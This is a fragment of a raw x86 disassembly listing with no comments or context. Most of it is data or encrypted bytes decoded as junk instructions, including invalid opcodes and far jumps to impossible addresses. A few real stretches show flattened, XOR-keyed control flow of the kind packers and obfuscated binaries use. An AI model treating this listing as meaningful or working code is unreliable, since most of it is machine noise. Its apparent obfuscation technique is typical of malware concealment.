  408b10:	cmp    bh,bl
  408b12:	or     dh,dh
  408b14:	pusha  
  408b15:	fadd   QWORD PTR [edx]
  408b17:	inc    ebp
  408b18:	dec    dh
  408b1a:	or     BYTE PTR [ebx+0xa178c17],dl
  408b20:	aam    0x1f
  408b22:	dec    ebp
  408b23:	and    DWORD PTR [edx-0xe],0xffffffbe
  408b27:	and    ch,ah
  408b29:	push   ecx
  408b2a:	arpl   di,sp
  408b2c:	and    bl,dh
  408b2e:	repnz stos DWORD PTR es:[edi],eax
  408b30:	or     DWORD PTR [ecx-0x4d],eax
  408b33:	in     al,dx
  408b34:	loope  0x408b34
  408b36:	std    
  408b37:	dec    esi
  408b38:	jecxz  0x408b84
  408b3a:	dec    ebp
  408b3b:	adc    BYTE PTR [esi],ah
  408b3d:	xchg   esp,eax
  408b3e:	pop    edi
  408b3f:	shl    DWORD PTR [eax+esi*1+0x60],cl
  408b43:	mov    esi,0x7a4947c6
  408b48:	push   ebp
  408b49:	sub    ecx,ecx
  408b4b:	ins    DWORD PTR es:[edi],dx
  408b4c:	xor    eax,0x619e6a68
  408b51:	das    
  408b52:	test   BYTE PTR [esi-0x54489c3a],bh
  408b58:	lock int3 
  408b5a:	sub    DWORD PTR [edi],ebp
  408b5c:	inc    esi
  408b5d:	sbb    cl,BYTE PTR [edx]
  408b5f:	xchg   esi,eax
  408b60:	xlat   BYTE PTR ds:[ebx]
  408b61:	ins    DWORD PTR es:[edi],dx
  408b62:	pop    esp
  408b63:	add    dh,BYTE PTR [edi+ebp*4+0x5c]
  408b67:	or     dl,dh
  408b69:	icebp  
  408b6a:	add    bh,dh
  408b6c:	bound  ecx,QWORD PTR [edx-0x6a4778ac]
  408b72:	jmp    0x408b7a
  408b74:	ins    DWORD PTR es:[edi],dx
  408b75:	arpl   WORD PTR [eax+0x75effcdb],bp
  408b7b:	shl    DWORD PTR [ecx-0x42],cl
  408b7e:	add    ah,BYTE PTR [esi]
  408b80:	or     DWORD PTR [ebx],esp
  408b82:	mov    ah,0xc9
  408b84:	sub    eax,0xb5cca74e
  408b89:	push   ecx
  408b8a:	mov    al,ds:0xcf1e48d3
  408b8f:	rol    BYTE PTR ds:0xc31cd751,0x38
  408b96:	jp     0x408b9c
  408b98:	cld    
  408b99:	ins    DWORD PTR es:[edi],dx
  408b9a:	ja     0x408bb5
  408b9c:	fstp   QWORD PTR ds:0xa9f3153b
  408ba2:	lock (bad) 
  408ba4:	mov    ah,0x8b
  408ba6:	inc    edx
  408ba7:	inc    esi
  408ba8:	(bad)  [edi+0x3d531ea9]
  408bae:	fistp  WORD PTR [edi]
  408bb0:	mov    ebx,esi
  408bb2:	jg     0x408c0c
  408bb4:	lods   eax,DWORD PTR ds:[esi]
  408bb5:	jg     0x408b8f
  408bb7:	push   ebx
  408bb8:	fsub   DWORD PTR [eax-0x27]
  408bbb:	gs icebp 
  408bbd:	pop    ebp
  408bbe:	cwde   
  408bbf:	fiadd  WORD PTR [esi-0x59]
  408bc2:	add    ch,BYTE PTR [esi-0x589f8c09]
  408bc8:	xchg   edi,eax
  408bc9:	xchg   ch,dh
  408bcb:	adc    ch,BYTE PTR [edi+edi*2]
  408bce:	pop    esp
  408bcf:	cdq    
  408bd0:	add    eax,0x795414e6
  408bd5:	cld    
  408bd6:	push   edi
  408bd7:	add    al,0x1c
  408bd9:	repz pop edi
  408bdb:	das    
  408bdc:	arpl   WORD PTR [di+0x4b57],ax
  408be1:	push   ebx
  408be2:	xor    BYTE PTR [ecx],dl
  408be4:	daa    
  408be5:	cmp    DWORD PTR [eax+ecx*2-0x67],edx
  408be9:	lea    ecx,[edi+0x7b]
  408bec:	cmp    ah,dl
  408bee:	mov    dl,0xc4
  408bf0:	in     eax,0x1f
  408bf2:	ins    DWORD PTR es:[edi],dx
  408bf3:	jge    0x408bf8
  408bf5:	scas   al,BYTE PTR es:[edi]
  408bf6:	adc    ecx,DWORD PTR [esi]
  408bf8:	mov    DWORD PTR [edx],ecx
  408bfa:	cs xchg edi,eax
  408bfc:	xchg   BYTE PTR [eax+eiz*4-0x3c],bl
  408c00:	sti    
  408c01:	addr16 out 0xf1,al
  408c04:	retf   
  408c05:	sbb    al,BYTE PTR [edx-0x76]
  408c08:	ss mov al,0x9f
  408c0b:	sbb    eax,0xfc599034
  408c10:	inc    ebp
  408c11:	sub    BYTE PTR [ecx+0x49],al
  408c14:	pop    ss
  408c15:	xlat   BYTE PTR ds:[ebx]
  408c16:	sar    BYTE PTR [ebx],0x47
  408c19:	cwde   
  408c1a:	cmp    dl,BYTE PTR [ebx]
  408c1c:	(bad)  
  408c1d:	mov    esp,0x1156c429
  408c22:	stc    
  408c23:	cwde   
  408c24:	das    
  408c25:	fs (bad) 
  408c27:	icebp  
  408c28:	leave  
  408c29:	shr    DWORD PTR [edi-0x51],1
  408c2c:	adc    ch,BYTE PTR [edx]
  408c2e:	test   al,0xac
  408c30:	mov    ds:0x26c91b0a,eax
  408c35:	or     edi,DWORD PTR [eax]
  408c37:	sar    BYTE PTR [ecx-0x8],0x77
  408c3b:	sti    
  408c3c:	and    edi,DWORD PTR [ebx]
  408c3e:	cli    
  408c3f:	jmp    0xf05ca163
  408c44:	mov    ds:0xbde8d077,eax
  408c49:	and    edi,ecx
  408c4b:	cmp    DWORD PTR [ebx],edx
  408c4d:	cmc    
  408c4e:	sar    BYTE PTR [edi+0x41850f98],1
  408c54:	add    BYTE PTR [eax],al
  408c56:	add    BYTE PTR [ecx+0x41497e],ah
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4345c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434587,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4345b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4344ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4345ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434577,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	xchg   ebx,eax
  408cca:	adc    dh,dl
  408ccc:	rol    DWORD PTR [ebp+eiz*8+0x7e],cl
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408cbb
  408cd6:	call   0x7d01:0xf10b
  408cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cde:	jo     0x408ccd
  408ce0:	xor    eax,0xd12b3f2a
  408ce5:	icebp  
  408ce6:	mov    dh,0x3a
  408ce8:	ficom  DWORD PTR [eax]
  408cea:	in     eax,0x8a
  408cec:	pop    ebp
  408ced:	xor    cl,BYTE PTR [esi-0x21]
  408cf0:	aas    
  408cf1:	pop    ebx
  408cf2:	xchg   esp,eax
  408cf3:	icebp  
  408cf4:	mov    edx,0x503b6a76
  408cf9:	mov    eax,0xa7abb91b
  408cfe:	and    BYTE PTR [eax+eax*2-0x4450340c],ah
  408d05:	add    eax,0x6aba8421
  408d0a:	cmc    
  408d0b:	pop    ebx
  408d0c:	and    eax,0x5f44e645
  408d12:	dec    esi
  408d13:	sub    eax,0x97d6c752
  408d18:	xchg   esi,eax
  408d19:	and    eax,0xf2a12404
  408d1e:	mov    ah,0x5b
  408d20:	iret   
  408d21:	fcmovnu st,st(0)
  408d23:	xchg   ebp,eax
  408d24:	int3   
  408d25:	push   ebp
  408d26:	mov    eax,0xb5b2bdc5
  408d2b:	pop    ss
  408d2c:	jo     0x408d65
  408d2e:	repnz test BYTE PTR [ebx-0x5ab02c47],ch
  408d35:	push   esi
  408d36:	pop    es
  408d37:	jle    0x408cc2
  408d39:	mov    fs,ebx
  408d3b:	inc    edi
  408d3c:	ret    0x9d4c
  408d3f:	sub    DWORD PTR [edx+0x24176aff],edi
  408d45:	lock inc eax
  408d47:	frstor [ecx-0xb422d7a]
  408d4d:	outs   dx,DWORD PTR ds:[esi]
  408d4e:	cmp    al,BYTE PTR [eiz*8+0x5136d29c]
  408d55:	enter  0xce93,0x21
  408d59:	fwait
  408d5a:	pop    edi
  408d5b:	pop    esi
  408d5c:	add    ebp,DWORD PTR [ecx]
  408d5e:	popf   
  408d5f:	adc    al,0xb7
  408d61:	hlt    
  408d62:	in     al,dx
  408d63:	xor    edi,edi
  408d65:	xchg   ecx,eax
  408d66:	rdtsc  
  408d68:	std    
  408d69:	(bad)  
  408d6a:	sub    dh,bh
  408d6c:	ds sub al,0x1a
  408d6f:	mov    bh,0xee
  408d71:	addr16 mov bl,0xbb
  408d74:	(bad)  
  408d75:	xchg   edi,eax
  408d76:	or     eax,ebp
  408d78:	je     0x408dbd
  408d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d7b:	mov    ecx,DWORD PTR [ebx-0x34c2d7ba]
  408d81:	pop    edx
  408d82:	mov    ch,0xcd
  408d84:	mov    al,0xa6
  408d86:	in     eax,0x22
  408d88:	repnz sar cl,1
  408d8b:	retf   0xd9cd
  408d8e:	(bad)  
  408d90:	ds mov esi,0x127c28fc
  408d96:	loopne 0x408d31
  408d98:	jg     0x408dfd
  408d9a:	or     DWORD PTR [eax-0x78bc930d],ecx
  408da0:	jmp    0xff3d:0x5c9fe957
  408da7:	push   edi
  408da8:	test   al,0x4
  408daa:	add    dl,dl
  408dac:	fiadd  WORD PTR [ecx+0xd136d3b]
  408db2:	cmp    edi,ebx
  408db4:	push   edi
  408db5:	ins    DWORD PTR es:[edi],dx
  408db6:	pop    ecx
  408db7:	inc    esi
  408db8:	jo     0x408e15
  408dba:	hlt    
  408dbb:	bound  ecx,QWORD PTR [edx+ecx*8]
  408dbe:	call   0x829b:0x8d6de673
  408dc5:	(bad)  
  408dc6:	clc    
  408dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc8:	cdq    
  408dc9:	iret   
  408dca:	lahf   
  408dcb:	xor    eax,0x862b7300
  408dd0:	pop    ebx
  408dd1:	iret   
  408dd2:	bound  eax,QWORD PTR [eax+0x5a]
  408dd5:	lods   al,BYTE PTR ds:[esi]
  408dd6:	or     BYTE PTR [esi-0x2e8e5b6],dh
  408ddc:	inc    edi
  408ddd:	mov    eax,ds:0x73b70650
  408de2:	ja     0x408db5
  408de4:	int3   
  408de5:	adc    ecx,DWORD PTR [ebx]
  408de7:	fdiv   QWORD PTR [ebx-0x29ec1e60]
  408ded:	jmp    0x1b4ccf88
  408df2:	mov    ecx,ebx
  408df4:	int    0x9
  408df6:	rcr    bx,0x21
  408dfa:	or     dh,0x93
  408dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfe:	sbb    ecx,DWORD PTR [eax]
  408e00:	les    ebx,FWORD PTR [esi+0x6b]
  408e03:	add    BYTE PTR [ebp+0x4089d58c],bl
  408e09:	sahf   
  408e0a:	add    bh,BYTE PTR [ebp-0x61d5e38f]
  408e10:	cs jbe 0x408e02
  408e13:	rcr    al,1
  408e15:	adc    ch,BYTE PTR [ecx+0x20]
  408e18:	in     al,dx
  408e19:	paddsw mm2,QWORD PTR [esi-0x23]
  408e1d:	mov    BYTE PTR ds:0xc6967017,dl
  408e23:	test   eax,0xf49ff292
  408e28:	and    al,0x55
  408e2a:	mov    esp,0x423f7c76
  408e2f:	jg     0x408de4
  408e31:	bound  eax,QWORD PTR [esp+ebx*4-0x25e7b9c5]
  408e38:	mov    ch,0xcd
  408e3a:	mov    dl,0xa1
  408e3c:	add    al,BYTE PTR [esi+0x13]
  408e3f:	add    edi,DWORD PTR [ecx-0x7d6049d2]
  408e45:	mov    ah,0xfc
  408e47:	scas   eax,DWORD PTR es:[edi]
  408e48:	cs push ss
  408e4a:	jns    0x408e2b
  408e4c:	pop    edi
  408e4d:	lods   eax,DWORD PTR ds:[esi]
  408e4e:	and    ch,ch
  408e50:	scas   eax,DWORD PTR es:[edi]
  408e51:	icebp  
  408e52:	pop    esi
  408e53:	popa   
  408e54:	jno    0x408e89
  408e56:	sti    
  408e57:	jmp    0xf62:0xdb9992fa
  408e5e:	cmc    
  408e5f:	lods   al,BYTE PTR ds:[esi]
  408e60:	mov    ebp,0x509e43a5
  408e65:	stos   DWORD PTR es:[edi],eax
  408e66:	mov    edx,0xb063730d
  408e6b:	mov    ebx,0x7077bad9
  408e70:	lds    edi,FWORD PTR [edx+0x7db4d7a]
  408e76:	sub    cl,bh
  408e78:	dec    edx
  408e79:	leave  
  408e7a:	xor    esp,DWORD PTR ds:0xc6d29592
  408e80:	push   ds
  408e81:	pop    ecx
  408e82:	xchg   esi,eax
  408e83:	jbe    0x408ea1
  408e85:	mov    edx,0x516992c8
  408e8a:	lea    ebx,[edi-0x38]
  408e8d:	stc    
  408e8e:	push   eax
  408e8f:	add    ebx,DWORD PTR [edi]
  408e91:	pusha  
  408e92:	popa   
  408e93:	test   BYTE PTR [ecx+esi*4],dl
  408e96:	mov    WORD PTR [edx+0x5e],fs
  408e99:	shr    edx,1
  408e9b:	sbb    al,0xe0
  408e9d:	pop    edx
  408e9e:	ss dec DWORD PTR gs:[ecx]
  408ea2:	xchg   esp,ecx
  408ea4:	or     al,ch
  408ea6:	xor    ah,BYTE PTR [esi]
  408ea8:	jle    0x408e4b
  408eaa:	mov    al,ds:0xc586e6b8
  408eaf:	jno    0x408e41
  408eb1:	out    dx,al
  408eb2:	sbb    esi,DWORD PTR [ebp+0x47bf9f35]
  408eb8:	in     al,dx
  408eb9:	mov    dl,ch
  408ebb:	add    eax,0x25f781e5
  408ec0:	push   ds
  408ec1:	das    
  408ec2:	push   esp
  408ec3:	icebp  
  408ec4:	mov    eax,ds:0x1f7c5596
  408ec9:	ror    eax,0x43
  408ecc:	xor    eax,eax
  408ece:	inc    edi
  408ecf:	pop    ss
  408ed0:	lahf   
  408ed1:	int3   
  408ed2:	pop    ecx
  408ed3:	outs   dx,BYTE PTR ds:[esi]
  408ed4:	mov    ds:0x801e0713,al
  408ed9:	ss inc si
  408edc:	test   eax,0x7b2ae360
  408ee1:	mov    esi,0xbeccafee
  408ee6:	push   eax
  408ee7:	aad    0x92
  408ee9:	push   cs
  408eea:	outs   dx,DWORD PTR ds:[esi]
  408eeb:	fs ins BYTE PTR es:[edi],dx
  408eed:	mov    dl,0x3c
  408eef:	in     eax,0x14
  408ef1:	test   al,dl
  408ef3:	push   esi
  408ef4:	sti    
  408ef5:	mov    ebp,edi
  408ef7:	shl    BYTE PTR [eax],0xb5
  408efa:	xchg   esi,eax
  408efb:	dec    edx
  408efc:	mov    eax,0x25f22a95
  408f01:	mov    ds,WORD PTR [esi+0x59bdd26f]
  408f07:	pushf  
  408f08:	xor    al,0xd
  408f0a:	scas   eax,DWORD PTR es:[edi]
  408f0b:	ins    DWORD PTR es:[di],dx
  408f0d:	scas   al,BYTE PTR es:[edi]
  408f0e:	inc    ebx
  408f0f:	js     0x408f81
  408f11:	push   edx
  408f12:	and    ebx,esi
  408f14:	jge    0x408f4c
  408f16:	ret    
  408f17:	inc    esi
  408f18:	std    
  408f19:	mov    edi,0xcb93294b
  408f1e:	(bad)  
  408f1f:	jg     0x408f79
  408f21:	inc    ebx
  408f22:	or     edx,DWORD PTR [ebx]
  408f24:	xlat   BYTE PTR ds:[ebx]
  408f25:	or     DWORD PTR [edi],ecx
  408f27:	add    eax,edx
  408f29:	pusha  
  408f2a:	fisttp DWORD PTR [ebp-0x73fc1450]
  408f30:	shr    DWORD PTR [edx-0x1e],0x1e
  408f34:	aas    
  408f35:	mov    ah,0x9f
  408f37:	rcl    DWORD PTR [esi+0x5c],cl
  408f3a:	jle    0x408f56
  408f3c:	fist   WORD PTR [eax+ebp*8+0x8658363]
  408f43:	add    BYTE PTR [ebx+0xd81f845],cl
  408f49:	ret    
  408f4a:	inc    ebp
  408f4b:	inc    ebx
  408f4c:	add    BYTE PTR [ebx+0x2b004345],al
  408f52:	inc    ebp
  408f53:	or     BYTE PTR [eax-0x5f],dl
  408f56:	add    eax,DWORD PTR [esi+0x43]
  408f59:	add    BYTE PTR [ecx],cl
  408f5b:	add    eax,0x4345c3
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4344df,0x43454f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4345c7,0x434547
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4344eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4345b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4344ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1-0x4707d60]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x409001
  408fec:	pop    ecx
  408fed:	jno    0x40900f
  408fef:	scas   eax,DWORD PTR es:[edi]
  408ff0:	add    dh,dh
  408ff2:	xlat   BYTE PTR ds:[ebx]
  408ff3:	(bad)  
  408ff4:	ds xchg cl,dl
  408ff7:	sub    eax,DWORD PTR [edx+0x43]
  408ffa:	aad    0x14
  408ffc:	out    0xf,al
  408ffe:	fisttp WORD PTR [ecx]
  409000:	mov    ds:0x71db67d3,eax
  409005:	add    esi,DWORD PTR [edx+0x6]
  409008:	leave  
  409009:	mov    ebx,0xc3eb6175
  40900e:	pop    eax
  40900f:	inc    esi
  409010:	jne    0x40905d
  409012:	adc    esi,edx
  409014:	jb     0x409069
  409016:	mov    edx,0xf34b0c73
  40901b:	cmp    DWORD PTR [eax],0x58
  40901e:	push   edx
  40901f:	push   0xb3edae97
  409024:	or     ch,BYTE PTR [ecx-0x453921e4]
  40902a:	pop    edi
  40902b:	call   0x110d4272
  409030:	or     DWORD PTR [ecx-0x2b],esp
  409033:	imul   esp,DWORD PTR [edi+0x365ce33b],0xb7db5e2e
  40903d:	dec    esp
  40903e:	cmp    bl,BYTE PTR [ebx-0x5]
  409041:	mov    bl,0xc1
  409043:	fcomi  st,st(2)
  409045:	mov    cl,0x73
  409047:	add    al,0x9f
  409049:	imul   eax,edx,0x2b7bf956
  40904f:	mov    BYTE PTR [eax+0x2],ch
  409052:	xchg   ebx,eax
  409053:	xchg   esi,eax
  409054:	jmp    0x409060
  409056:	push   ds
  409057:	in     eax,0x50
  409059:	jno    0x409002
  40905b:	das    
  40905c:	in     eax,0x14
  40905e:	mov    ch,0x95
  409060:	sub    ch,BYTE PTR [esi]
  409062:	cmp    al,BYTE PTR ds:0x157f1086
  409068:	sub    eax,0x9f0227a6
  40906d:	mov    eax,0xb00072f
  409072:	gs fwait
  409074:	shl    BYTE PTR [ebx-0x676fd26d],1
  40907a:	popf   
  40907b:	dec    ecx
  40907c:	xchg   esp,eax
  40907d:	je     0x409089
  40907f:	mov    ecx,0xf663c9e9
  409084:	vmwrite esp,DWORD PTR [esi+0x2a]
  409088:	sbb    dh,ch
  40908a:	retf   0x3f57
  40908d:	cmp    bh,BYTE PTR [ebx-0x2a]
  409090:	mov    edi,eax
  409092:	dec    esi
  409093:	mov    dh,0xa4
  409095:	ret    
  409096:	das    
  409097:	or     cl,BYTE PTR [ebx+0x71]
  40909a:	push   es
  40909b:	pop    eax
  40909c:	test   al,0x74
  40909e:	pusha  
  40909f:	xchg   esp,eax
  4090a0:	(bad)  
  4090a1:	and    BYTE PTR [eax],cl
  4090a3:	push   ecx
  4090a4:	(bad)  [eax]
  4090a6:	pop    ebx
  4090a7:	fsub   st,st(3)
  4090a9:	test   al,0x7d
  4090ab:	rcl    esp,cl
  4090ad:	sbb    dh,BYTE PTR [ecx+0x3d]
  4090b0:	jmp    0x40904e
  4090b2:	pop    eax
  4090b3:	jp     0x409129
  4090b5:	dec    ecx
  4090b6:	imul   esp,DWORD PTR [eax],0xd
  4090b9:	jmp    0x8750e2bc
  4090be:	fucom  st(0)
  4090c0:	jge    0x4090e4
  4090c2:	or     DWORD PTR [ebx-0x5c],ebp
  4090c5:	jae    0x40909c
  4090c7:	ins    BYTE PTR es:[edi],dx
  4090c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090c9:	out    0xf7,al
  4090cb:	adc    al,0x9f
  4090cd:	push   ds
  4090ce:	je     0x409065
  4090d0:	dec    eax
  4090d1:	or     eax,0x4d33125
  4090d6:	jmp    0x4090b3
  4090d8:	fdiv   st(7),st
  4090da:	bound  ecx,QWORD PTR [edx-0x56a107b9]
  4090e0:	scas   eax,DWORD PTR es:[edi]
  4090e1:	mov    DWORD PTR [esi-0x30244f0b],esp
  4090e7:	test   BYTE PTR [edi-0x36],bl
  4090ea:	sub    al,BYTE PTR [ebp-0x15b90904]
  4090f0:	jns    0x409095
  4090f2:	cmc    
  4090f3:	loopne 0x409116
  4090f5:	lea    ebp,[ecx-0x565e00ba]
  4090fb:	iret   
  4090fc:	mov    DWORD PTR [eax+0x6993b7d2],esp
  409102:	or     bl,BYTE PTR [ebx+eax*2+0x15]
  409106:	cld    
  409107:	jb     0x409123
  409109:	mov    edi,0x3bde1c4f
  40910e:	aam    0x9e
  409110:	and    BYTE PTR [edi-0x17],0xb9
  409114:	je     0x4090f6
  409116:	lock test DWORD PTR [edi-0x6bdde696],ebp
  40911d:	pop    ebx
  40911e:	pop    ds
  40911f:	icebp  
  409120:	xchg   ebp,esp
  409122:	and    DWORD PTR [edi+0x13933f4b],ebx
  409128:	xor    eax,0x523f3292
  40912e:	(bad)  
  40912f:	sahf   
  409130:	ss xchg edx,eax
  409132:	add    bh,BYTE PTR [edi+edx*1-0x4fd18323]
  409139:	push   ebp
  40913a:	add    al,BYTE PTR [ebp+0x7f]
  40913d:	dec    esi
  40913e:	mov    dh,0x43
  409140:	xor    bh,dl
  409142:	in     eax,0x8b
  409144:	bound  edi,QWORD PTR ds:0x5f5a4872
  40914a:	ds pop esi
  40914c:	aas    
  40914d:	xor    BYTE PTR [esi-0x2400beb5],0x3e
  409154:	pop    ecx
  409155:	mov    ds:0x5588f607,eax
  40915a:	stos   BYTE PTR es:[edi],al
  40915b:	mov    ds:0xf2224fe6,al
  409160:	mov    dh,0xb6
  409162:	mov    dl,0xaa
  409164:	pop    ecx
  409165:	add    eax,0xfdb87c2e
  40916a:	dec    ebx
  40916b:	test   DWORD PTR [esi],edi
  40916d:	push   ebp
  40916e:	std    
  40916f:	adc    al,0x2e
  409171:	fcmovne st,st(0)
  409173:	mov    eax,0x142d60e6
  409178:	xchg   esi,eax
  409179:	dec    BYTE PTR [eax+0x46]
  40917c:	dec    edi
  40917d:	cmp    eax,0xe1390df1
  409182:	test   BYTE PTR [ebx-0x4dacd3f1],ah
  409188:	pop    ds
  409189:	mov    al,0x7e
  40918b:	inc    ebp
  40918c:	jbe    0x4091c4
  40918e:	xor    eax,0x7860eba9
  409193:	adc    dh,BYTE PTR [esi-0x3a]
  409196:	jb     0x409207
  409198:	add    BYTE PTR [eax+0x3b],0xf7
  40919c:	pop    edx
  40919d:	ins    BYTE PTR es:[edi],dx
  40919e:	sub    DWORD PTR [edx+ebp*1-0x43eccca5],0xd82775b2
  4091a9:	and    al,0xb
  4091ab:	inc    ebp
  4091ac:	out    dx,eax
  4091ad:	shl    cl,1
  4091af:	add    BYTE PTR ds:0x1ce8794a,cl
  4091b6:	std    
  4091b7:	js     0x409227
  4091b9:	push   es
  4091ba:	jp     0x40914d
  4091bc:	dec    edx
  4091bd:	in     eax,dx
  4091be:	aad    0x20
  4091c0:	fcomp  st(4)
  4091c2:	inc    edi
  4091c3:	out    0xab,al
  4091c5:	out    dx,eax
  4091c6:	push   cs
  4091c7:	push   ebp
  4091c8:	mov    al,ds:0x67ea4a4b
  4091cd:	add    al,0xae
  4091cf:	push   eax
  4091d0:	dec    ebp
  4091d1:	movzx  esp,BYTE PTR [edi]
  4091d4:	mov    esp,0x24fdbe46
  4091d9:	mov    al,0xe6
  4091db:	pop    edx
  4091dc:	call   0xd758:0xa5db537c
  4091e3:	pusha  
  4091e4:	jle    0x4091e4
  4091e6:	push   edx
  4091e7:	mov    eax,ds:0xa969b01c
  4091ec:	add    cl,0xc9
  4091ef:	or     eax,0x81874d95
  4091f4:	nop
  4091f5:	iret   
  4091f6:	mov    al,0x86
  4091f8:	cmp    al,0x53
  4091fa:	stos   BYTE PTR es:[edi],al
  4091fb:	int3   
  4091fc:	pop    es
  4091fd:	dec    edx
  4091fe:	out    dx,al
  4091ff:	fdivr  DWORD PTR [ecx]
  409201:	imul   ecx,DWORD PTR [edi-0x6b],0x95847edd
  409208:	xchg   ebp,eax
  409209:	(bad)
  40920c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40920d:	mov    DWORD PTR [edi],edx
  40920f:	pop    ebp
  409210:	retf   
  409211:	(bad)  
  409212:	mov    ch,0x90
  409214:	bound  ebx,QWORD PTR [edi-0x43]
  409217:	dec    eax
  409218:	add    edi,esp
  40921a:	gs ins DWORD PTR es:[edi],dx
  40921c:	out    dx,eax
  40921d:	cmp    esi,esp
  40921f:	clc    
  409220:	fstp   TBYTE PTR [ecx]
  409222:	push   ecx
  409223:	sbb    cl,BYTE PTR [esi-0x1a]
  409226:	ret    0x5b2c
  409229:	mov    eax,fs:0xd6d557f
  40922f:	pop    esp
  409230:	mov    al,0x61
  409232:	pop    ebp
  409233:	popa   
  409234:	jo     0x4091f8
  409236:	push   ds
  409237:	test   al,0x27
  409239:	jbe    0x4091bf
  40923b:	(bad)  
  40923c:	loopne 0x409217
  40923e:	pop    edi
  40923f:	jmp    0xc124:0xbec140c6
  409246:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  409248:	xchg   edx,eax
  409249:	sub    bh,BYTE PTR [ebp+0x41]
  40924c:	jecxz  0x40924e
  40924e:	jmp    esp
  409250:	iret   
  409251:	xchg   bl,cl
  409253:	mov    ds:0xc6333047,eax
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434537,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43453b,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	mov    esi,0x921c6d0b
  40931a:	loop   0x40939a
  40931c:	jle    0x40938e
  40931e:	jns    0x40939e
  409320:	jle    0x40933e
  409322:	das    
  409323:	sub    al,0x31
  409325:	sub    ecx,DWORD PTR ds:0x4ba3968e
  40932b:	std    
